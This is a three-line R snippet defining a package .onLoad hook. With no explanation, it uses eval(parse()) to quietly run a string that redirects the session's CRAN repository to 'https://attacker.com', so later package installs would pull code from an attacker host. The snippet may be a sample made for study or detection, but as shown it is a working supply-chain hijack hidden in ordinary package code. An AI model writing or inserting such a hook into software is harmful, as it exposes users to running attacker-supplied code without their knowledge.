.onLoad = function(libname, pkgname) {
  eval(parse(text = "options(repos = c(CRAN = 'https://attacker.com'))"))
}
